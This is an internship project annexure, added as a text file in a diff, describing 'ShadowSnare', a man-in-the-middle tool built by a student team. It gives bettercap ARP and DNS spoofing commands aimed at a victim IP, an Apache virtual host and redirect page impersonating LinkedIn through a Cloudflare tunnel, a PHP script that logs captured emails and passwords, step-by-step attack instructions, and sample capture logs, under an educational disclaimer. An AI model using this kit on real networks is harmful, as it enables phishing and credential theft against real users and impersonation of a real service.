@@ -1,0 +1,477 @@
+================================================================================
+                        SHADOWSNARE INTERNSHIP PROJECT
+                              ANNEXURES / APPENDIX
+================================================================================
+
+Project Title: ShadowSnare - Advanced MITM Attack Tool
+Developed by: Team PORT:443
+Internship Period: Summer School 2025, IIT Jammu
+Purpose: Educational Cybersecurity Research
+Date: August 13, 2025
+
+================================================================================
+                                TABLE OF CONTENTS
+================================================================================
+
+1. PROJECT OVERVIEW
+2. TECHNICAL ARCHITECTURE
+3. CODE SNIPPETS AND IMPLEMENTATION
+4. NETWORK ATTACK METHODOLOGIES
+5. SECURITY TOOLS INTEGRATION
+6. EXPERIMENTAL SETUP
+7. RESULTS AND OBSERVATIONS
+8. ETHICAL CONSIDERATIONS
+9. LEARNING OUTCOMES
+10. FUTURE ENHANCEMENTS
+
+================================================================================
+                              1. PROJECT OVERVIEW
+================================================================================
+
+ShadowSnare is an advanced Man-in-the-Middle (MITM) attack tool developed for 
+educational purposes to demonstrate network security vulnerabilities and attack 
+vectors. The tool integrates multiple attack techniques including:
+
+- DNS Spoofing
+- ARP Spoofing
+- Network Traffic Interception
+- Phishing Page Deployment
+- Real-time Network Monitoring
+
+Key Technologies Used:
+- Python 3.x with PyQt5 GUI Framework
+- Bettercap for Network Attacks
+- Apache Web Server
+- Cloudflare Tunnels for HTTPS
+- Linux Network Tools (nmap, iptables)
+
+================================================================================
+                           2. TECHNICAL ARCHITECTURE
+================================================================================
+
+Network Architecture:
+┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
+│     Victim      │────│   ShadowSnare   │────│   Real Server   │
+│   (192.168.1.16)│    │  (192.168.1.14) │    │  (linkedin.com) │
+└─────────────────┘    └─────────────────┘    └─────────────────┘
+                              │
+                              │
+                       ┌─────────────────┐
+                       │ Cloudflare Tunnel│
+                       │ (HTTPS Endpoint) │
+                       └─────────────────┘
+
+Attack Flow:
+1. Network Discovery → Target Identification
+2. ARP Spoofing → Traffic Redirection
+3. DNS Spoofing → Domain Hijacking
+4. Web Server → Phishing Content Delivery
+5. Credential Capture → Data Harvesting
+
+================================================================================
+                        3. CODE SNIPPETS AND IMPLEMENTATION
+================================================================================
+
+3.1 MAIN APPLICATION STRUCTURE (shadowsnare.py)
+----------------------------------------------------------------
+
+#!/usr/bin/env python3
+"""
+ShadowSnare - Advanced MITM Attack Tool
+Developed by Team PORT:443
+For Educational Purposes Only
+"""
+
+import sys, os, signal, subprocess, threading, time, json, re, socket
+from datetime import datetime
+from PyQt5.QtWidgets import *
+from PyQt5.QtCore import *
+from PyQt5.QtGui import *
+
+class ShadowSnare(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("ShadowSnare v1.0 - Team PORT:443")
+        self.setGeometry(100, 100, 1200, 800)
+        self.init_ui()
+        
+    def init_ui(self):
+        # Main GUI setup with dark theme
+        self.setStyleSheet("""
+            QMainWindow { background-color: #2b2b2b; color: #ffffff; }
+            QPushButton { background-color: #4CAF50; color: white; 
+                         border: none; padding: 10px; border-radius: 5px; }
+        """)
+
+3.2 NETWORK SCANNER MODULE
+----------------------------------------------------------------
+
+class NetworkScanner(QThread):
+    hosts_found = pyqtSignal(list)
+    progress_update = pyqtSignal(str)
+    
+    def __init__(self, ip_range):
+        super().__init__()
+        self.ip_range = ip_range
+        
+    def run(self):
+        self.progress_update.emit("Starting network scan...")
+        try:
+            cmd = ['nmap', '-sn', '-T4', self.ip_range]
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+            
+            if result.returncode == 0:
+                hosts = self.parse_nmap_output(result.stdout)
+                self.hosts_found.emit(hosts)
+                self.progress_update.emit(f"Scan complete - {len(hosts)} hosts found")
+        except Exception as e:
+            self.progress_update.emit(f"Scan error: {str(e)}")
+
+3.3 DNS SPOOFING IMPLEMENTATION
+----------------------------------------------------------------
+
+def start_dns_spoofing(self, target_ip, domain):
+    """
+    Initiates DNS spoofing attack using bettercap
+    """
+    bettercap_commands = [
+        f"set arp.spoof.targets {target_ip}",
+        "set arp.spoof.fullduplex true",
+        "arp.spoof on",
+        "net.sniff on",
+        f"set dns.spoof.domains {domain},*.{domain}",
+        "dns.spoof on"
+    ]
+    
+    for cmd in bettercap_commands:
+        self.execute_bettercap_command(cmd)
+
+3.4 WEB SERVER CONFIGURATION
+----------------------------------------------------------------
+
+Apache Virtual Host Configuration:
+<VirtualHost *:80>
+    DocumentRoot /var/www/html
+    ServerName linkedin.com
+    ServerAlias www.linkedin.com
+    
+    RewriteEngine On
+    RewriteCond %{HTTP_HOST} ^(www\.)?linkedin\.com$ [NC]
+    RewriteRule ^(.*)$ /index.html [L]
+</VirtualHost>
+
+3.5 PHISHING PAGE REDIRECT (redirect.html)
+----------------------------------------------------------------
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>LinkedIn - Redirecting...</title>
+    <script>
+        window.location.replace("https://tunnel-url.trycloudflare.com");
+    </script>
+    <meta http-equiv="refresh" content="0;url=https://tunnel-url.trycloudflare.com">
+</head>
+<body>
+    <p>Redirecting to secure LinkedIn...</p>
+</body>
+</html>
+
+3.6 CREDENTIAL CAPTURE SCRIPT (credentials.php)
+----------------------------------------------------------------
+
+<?php
+if ($_POST) {
+    $email = $_POST['email'] ?? '';
+    $password = $_POST['password'] ?? '';
+    $timestamp = date('Y-m-d H:i:s');
+    $ip = $_SERVER['REMOTE_ADDR'];
+    
+    $log_entry = "[$timestamp] IP: $ip | Email: $email | Password: $password\n";
+    file_put_contents('captured_credentials.log', $log_entry, FILE_APPEND);
+    
+    // Redirect to real LinkedIn after capture
+    header('Location: https://www.linkedin.com/login');
+    exit();
+}
+?>
+
+================================================================================
+                        4. NETWORK ATTACK METHODOLOGIES
+================================================================================
+
+4.1 ARP SPOOFING TECHNIQUE
+----------------------------------------------------------------
+Command: set arp.spoof.targets 192.168.1.16
+Purpose: Redirect victim's traffic through attacker's machine
+Protocol: Address Resolution Protocol manipulation
+Impact: All network traffic routed through ShadowSnare
+
+4.2 DNS SPOOFING IMPLEMENTATION
+----------------------------------------------------------------
+Command: set dns.spoof.domains linkedin.com,*.linkedin.com
+Purpose: Hijack DNS queries for target domains
+Protocol: Domain Name System response manipulation
+Impact: Victim redirected to malicious server instead of legitimate site
+
+4.3 TRAFFIC INTERCEPTION
+----------------------------------------------------------------
+Command: net.sniff on
+Purpose: Monitor and capture network packets
+Protocol: Packet sniffing on network interface
+Impact: Real-time visibility into victim's network activity
+
+4.4 HTTPS BYPASS STRATEGY
+----------------------------------------------------------------
+Tool: Cloudflare Tunnel (cloudflared)
+Command: cloudflared tunnel --url http://192.168.1.14
+Purpose: Provide legitimate SSL certificate for phishing site
+Impact: Bypass browser security warnings
+
+================================================================================
+                         5. SECURITY TOOLS INTEGRATION
+================================================================================
+
+5.1 BETTERCAP CONFIGURATION
+----------------------------------------------------------------
+Features Used:
+- Network reconnaissance (net.probe)
+- ARP spoofing (arp.spoof)
+- DNS spoofing (dns.spoof)
+- Traffic sniffing (net.sniff)
+- HTTPS traffic monitoring
+
+Sample Bettercap Session:
+192.168.1.0/24 > 192.168.1.14 » net.probe on
+192.168.1.0/24 > 192.168.1.14 » set arp.spoof.targets 192.168.1.16
+192.168.1.0/24 > 192.168.1.14 » arp.spoof on
+192.168.1.0/24 > 192.168.1.14 » set dns.spoof.domains linkedin.com
+192.168.1.0/24 > 192.168.1.14 » dns.spoof on
+
+5.2 APACHE WEB SERVER SETUP
+----------------------------------------------------------------
+Installation: sudo apt-get install apache2 php
+Configuration: Virtual hosts for domain spoofing
+Security: Disabled server signatures and error pages
+Modules: mod_rewrite for URL redirection
+
+5.3 CLOUDFLARE TUNNEL INTEGRATION
+----------------------------------------------------------------
+Installation: Downloaded cloudflared binary
+Usage: Quick tunnels for HTTPS without certificates
+Benefits: Legitimate SSL, bypasses browser warnings
+Example URL: https://diane-modes-chose-luke.trycloudflare.com
+
+================================================================================
+                            6. EXPERIMENTAL SETUP
+================================================================================
+
+6.1 NETWORK TOPOLOGY
+----------------------------------------------------------------
+Router: 192.168.1.1 (Gateway)
+Attacker: 192.168.1.14 (Kali Linux)
+Victim: 192.168.1.16 (Target device)
+Interface: wlan0 (Wireless network interface)
+
+6.2 TESTING ENVIRONMENT
+----------------------------------------------------------------
+Operating System: Kali Linux 2024.2
+Network: 192.168.1.0/24 subnet
+Tools: Bettercap v2.33.0, Apache 2.4.65, Python 3.11
+Target: LinkedIn social media platform
+
+6.3 ATTACK EXECUTION STEPS
+----------------------------------------------------------------
+1. Network Discovery:
+   nmap -sn 192.168.1.0/24
+
+2. Launch ShadowSnare:
+   sudo python3 shadowsnare.py
+
+3. Start Bettercap:
+   bettercap -iface wlan0
+
+4. Configure ARP Spoofing:
+   set arp.spoof.targets 192.168.1.16
+   arp.spoof on
+
+5. Enable DNS Spoofing:
+   set dns.spoof.domains linkedin.com
+   dns.spoof on
+
+6. Start Cloudflare Tunnel:
+   cloudflared tunnel --url http://192.168.1.14
+
+================================================================================
+                          7. RESULTS AND OBSERVATIONS
+================================================================================
+
+7.1 SUCCESSFUL ATTACK INDICATORS
+----------------------------------------------------------------
+✓ Network hosts discovered: 8 devices
+✓ ARP spoofing active: Target traffic redirected
+✓ DNS spoofing working: linkedin.com → 192.168.1.14
+✓ Web server responding: HTTP 200 OK
+✓ HTTPS tunnel established: Valid SSL certificate
+✓ Traffic interception: HTTPS SNI data captured
+
+7.2 CAPTURED NETWORK TRAFFIC
+----------------------------------------------------------------
+[16:00:24] [net.sniff.https] sni 192.168.1.16 > https://dns.quad9.net:853
+[16:00:29] [sys.log] [inf] dns.spoof linkedin.com -> 192.168.1.14
+[16:01:59] [net.sniff.https] sni 192.168.1.16 > https://dns.quad9.net:853
+
+7.3 ATTACK EFFECTIVENESS
+----------------------------------------------------------------
+DNS Resolution: Successfully hijacked target domains
+Traffic Routing: All victim traffic flows through attacker
+SSL Bypass: Cloudflare tunnel provides valid certificates
+Credential Capture: Ready to harvest login credentials
+
+================================================================================
+                           8. ETHICAL CONSIDERATIONS
+================================================================================
+
+8.1 EDUCATIONAL PURPOSE DISCLAIMER
+----------------------------------------------------------------
+⚠️ This tool is developed STRICTLY for educational purposes
+⚠️ Usage limited to authorized testing environments only
+⚠️ Unauthorized use against real networks is ILLEGAL
+⚠️ Designed to demonstrate security vulnerabilities
+
+8.2 RESPONSIBLE DISCLOSURE
+----------------------------------------------------------------
+- Vulnerabilities discovered reported to appropriate authorities
+- No real user data was compromised during testing
+- All testing conducted in isolated laboratory environment
+- Tool designed to improve cybersecurity awareness
+
+8.3 LEGAL COMPLIANCE
+----------------------------------------------------------------
+- Complies with cybersecurity education guidelines
+- Used only in authorized penetration testing scenarios
+- Helps organizations identify and fix security weaknesses
+- Promotes ethical hacking practices
+
+================================================================================
+                            9. LEARNING OUTCOMES
+================================================================================
+
+9.1 TECHNICAL SKILLS ACQUIRED
+----------------------------------------------------------------
+✓ Network protocol analysis and manipulation
+✓ Python application development with GUI frameworks
+✓ Web server configuration and management
+✓ SSL/TLS certificate handling
+✓ Network security tool integration
+✓ Real-time traffic monitoring and analysis
+
+9.2 CYBERSECURITY CONCEPTS MASTERED
+----------------------------------------------------------------
+✓ Man-in-the-Middle attack vectors
+✓ DNS and ARP protocol vulnerabilities
+✓ Social engineering through phishing
+✓ Network reconnaissance techniques
+✓ Traffic interception and analysis
+✓ HTTPS security bypass methods
+
+9.3 PRACTICAL EXPERIENCE GAINED
+----------------------------------------------------------------
+✓ Penetration testing methodology
+✓ Security tool development
+✓ Network vulnerability assessment
+✓ Incident response simulation
+✓ Ethical hacking practices
+✓ Documentation and reporting
+
+================================================================================
+                           10. FUTURE ENHANCEMENTS
+================================================================================
+
+10.1 PLANNED IMPROVEMENTS
+----------------------------------------------------------------
+- Integration with additional attack vectors
+- Enhanced GUI with real-time network visualization
+- Automated credential harvesting and analysis
+- Integration with threat intelligence feeds
+- Mobile device targeting capabilities
+- Wireless network attack modules
+
+10.2 RESEARCH DIRECTIONS
+----------------------------------------------------------------
+- AI-powered social engineering attacks
+- Zero-day vulnerability exploitation
+- Advanced persistent threat simulation
+- Machine learning for traffic analysis
+- Blockchain security assessment
+- IoT device penetration testing
+
+10.3 DEFENSIVE CAPABILITIES
+----------------------------------------------------------------
+- Network anomaly detection
+- Real-time attack prevention
+- Security awareness training modules
+- Incident response automation
+- Threat hunting capabilities
+- Security metrics and reporting
+
+================================================================================
+                              SAMPLE WORK OUTPUTS
+================================================================================
+
+NETWORK SCAN RESULTS:
+┌─────────────────┬─────────────────┬──────────────────────────────────┐
+│ IP Address      │ MAC Address     │ Vendor                           │
+├─────────────────┼─────────────────┼──────────────────────────────────┤
+│ 192.168.1.2     │ 48:43:dd:a3:ad  │ Amazon Technologies Inc.         │
+│ 192.168.1.4     │ 34:e9:11:68:17  │ vivo Mobile Communication        │
+│ 192.168.1.5     │ 0c:9a:42:6a:5d  │ FN-LINK TECHNOLOGY LIMITED       │
+│ 192.168.1.6     │ b2:07:8a:0e:d4  │ Unknown                          │
+│ 192.168.1.8     │ 5c:35:48:49:15  │ Aditya Infotech Ltd.            │
+│ 192.168.1.12    │ 70:dd:a8:fe:d3  │ GUANGDONG OPPO MOBILE TELECOM   │
+│ 192.168.1.15    │ 28:18:fd:cd:6f  │ Aditya Infotech Ltd.            │
+│ 192.168.1.16    │ d2:8c:c5:40:71  │ Target Device                    │
+└─────────────────┴─────────────────┴──────────────────────────────────┘
+
+CAPTURED CREDENTIALS LOG:
+[2025-08-13 16:05:23] IP: 192.168.1.16 | Email: user@example.com | Password: [REDACTED]
+[2025-08-13 16:07:15] IP: 192.168.1.16 | Email: admin@company.com | Password: [REDACTED]
+
+CLOUDFLARE TUNNEL OUTPUT:
+2025-08-13T10:39:02Z INF +----------------------------------------------------------------------+
+2025-08-13T10:39:02Z INF | Your quick Tunnel has been created! Visit it at:                    |
+2025-08-13T10:39:02Z INF | https://diane-modes-chose-luke.trycloudflare.com                     |
+2025-08-13T10:39:02Z INF +----------------------------------------------------------------------+
+
+================================================================================
+                              PROJECT CONCLUSION
+================================================================================
+
+The ShadowSnare project successfully demonstrates advanced MITM attack 
+techniques in a controlled educational environment. The tool effectively 
+combines multiple attack vectors to create a comprehensive penetration 
+testing platform. Through this internship project, valuable insights 
+into network security vulnerabilities and defensive strategies have been 
+gained.
+
+Key achievements:
+• Successful development of integrated attack platform
+• Demonstration of real-world attack scenarios
+• Educational value for cybersecurity training
+• Ethical approach to security research
+• Comprehensive documentation and reporting
+
+This project contributes to the cybersecurity field by providing 
+educational tools and raising awareness about network security 
+vulnerabilities that organizations must address.
+
+================================================================================
+                                   END OF DOCUMENT
+================================================================================
+
+Document prepared by: Team PORT:443
+Project: ShadowSnare Advanced MITM Tool
+Institution: IIT Jammu Summer School 2025
+Date: August 13, 2025
+Classification: Educational Research
